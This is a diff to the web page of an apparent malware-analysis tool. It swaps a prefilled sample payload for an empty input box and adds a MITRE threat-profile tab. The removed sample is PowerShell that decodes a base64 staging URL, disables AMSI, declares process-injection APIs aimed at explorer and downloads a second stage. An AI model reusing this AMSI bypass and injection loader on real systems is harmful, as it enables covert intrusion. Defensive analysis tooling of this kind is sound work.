@@ -172,32 +172,7 @@
 </div>
 </div>
 <!-- Editable Code Surface -->
-<textarea id="payload-input" class="w-full bg-surface-container-lowest p-space-md min-h-[460px] max-h-[580px] font-code-sm text-code-sm leading-relaxed text-on-surface focus:outline-none focus:ring-1 focus:ring-primary resize-y" spellcheck="false">
-// AXON Capture #INC-8492 // Payload dropped via macro
-Set-Variable -Name "k9" -Value ([System.Convert]::FromBase64String('aHR0cHM6Ly9jZG4tdXBkYXRlcy13aW4ub3JnL2dhdGUucGhw'))
-$rawBytes = [System.Text.Encoding]::ASCII.GetString($k9)
-
-# Layer 2 In-Memory Reflection Invoke
-$m_ref = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
-$f_info = $m_ref.GetField('amsiInitFailed', 'NonPublic,Static')
-$f_info.SetValue($null, $True)
-
-$k_mem = @"
-[DllImport("kernel32.dll")]
-public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
-[DllImport("kernel32.dll")]
-public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-"@
-Add-Type -TypeDefinition $k_mem
-
-# Layer 3 Dynamic Process Target Injection
-$t_proc = Get-Process -Name 'explorer' -ErrorAction SilentlyContinue | Select-Object -First 1
-if ($t_proc) {
-    $h_proc = [System.Diagnostics.Process]::GetProcessById($t_proc.Id).Handle
-    $b_stage = (New-Object Net.WebClient).DownloadData($rawBytes)
-    [Kernel32]::VirtualAlloc([IntPtr]::Zero, $b_stage.Length, 0x3000, 0x40)
-}
-</textarea>
+<textarea id="payload-input" placeholder="// Paste raw or obfuscated script payload here..." class="w-full bg-surface-container-lowest p-space-md min-h-[460px] max-h-[580px] font-code-sm text-code-sm leading-relaxed text-on-surface focus:outline-none focus:ring-1 focus:ring-primary resize-y" spellcheck="false"></textarea>
 <!-- Editor Footer Status Line -->
 <div class="px-space-md py-space-xs bg-surface-container border-t border-surface-container flex items-center justify-between text-on-surface-variant font-code-sm text-code-sm">
 <div class="flex items-center gap-space-sm">
@@ -219,7 +194,7 @@ if ($t_proc) {
 <span class="material-symbols-outlined text-[16px]">terminal</span>
 <span>De-obfuscated Source</span>
 </button>
-<button class="px-space-md py-space-xs rounded text-on-surface-variant hover:text-on-surface hover:bg-surface-container font-body-sm text-body-sm flex items-center gap-space-xs transition-colors">
+<button id="tab-mitre" class="px-space-md py-space-xs rounded text-on-surface-variant hover:text-on-surface hover:bg-surface-container font-body-sm text-body-sm flex items-center gap-space-xs transition-colors cursor-pointer">
 <span class="material-symbols-outlined text-[16px]">security</span>
 <span>Threat Signature &amp; MITRE</span>
 </button>
@@ -349,10 +324,11 @@ if ($t_proc) {
   const outputBox = document.querySelectorAll('.bg-surface-container-lowest')[1];
   const tabDeob = document.getElementById('tab-deobfuscated');
   const tabYara = document.getElementById('tab-yara');
+  const tabMitre = document.getElementById('tab-mitre');
 
   // Helper to switch active tab visual state
   function setActiveTab(activeBtn) {
-    [tabDeob, tabYara].forEach(btn => {
+    [tabDeob, tabYara, tabMitre].forEach(btn => {
       if (!btn) return;
       btn.classList.remove('bg-surface-container', 'text-primary-container', 'font-semibold');
       btn.classList.add('text-on-surface-variant', 'hover:text-on-surface', 'hover:bg-surface-container');
@@ -386,6 +362,29 @@ if ($t_proc) {
         `;
     } else if (outputBox) {
         outputBox.innerHTML = '<div class="text-on-surface-variant italic p-4">No YARA rule available. Please analyze a payload first.</div>';
+    }
+  });
+
+  tabMitre?.addEventListener('click', () => {
+    setActiveTab(tabMitre);
+    if (lastData && outputBox && lastData.threat_profile) {
+        outputBox.innerHTML = `
+            <div class="text-error font-bold mb-space-sm">Threat Profile & MITRE ATT&CK Context</div>
+            <div class="p-space-sm bg-surface-container/30 rounded border-l-2 border-error mb-space-md">
+                <div class="text-on-surface-variant font-telemetry-micro text-telemetry-micro uppercase mb-1">Adversary Category</div>
+                <div class="text-primary font-body-sm">${lastData.threat_profile.adversary_category}</div>
+            </div>
+            <div class="p-space-sm bg-surface-container/30 rounded border-l-2 border-error mb-space-md">
+                <div class="text-on-surface-variant font-telemetry-micro text-telemetry-micro uppercase mb-1">Technique Pattern</div>
+                <div class="text-primary font-body-sm">${lastData.threat_profile.technique_pattern}</div>
+            </div>
+            <div class="p-space-sm bg-surface-container/30 rounded border-l-2 border-error">
+                <div class="text-on-surface-variant font-telemetry-micro text-telemetry-micro uppercase mb-1">Target Objective</div>
+                <div class="text-primary font-body-sm">${lastData.threat_profile.target_objective}</div>
+            </div>
+        `;
+    } else if (outputBox) {
+        outputBox.innerHTML = '<div class="text-on-surface-variant italic p-4">No threat signature available. Please analyze a payload first.</div>';
     }
   });
 
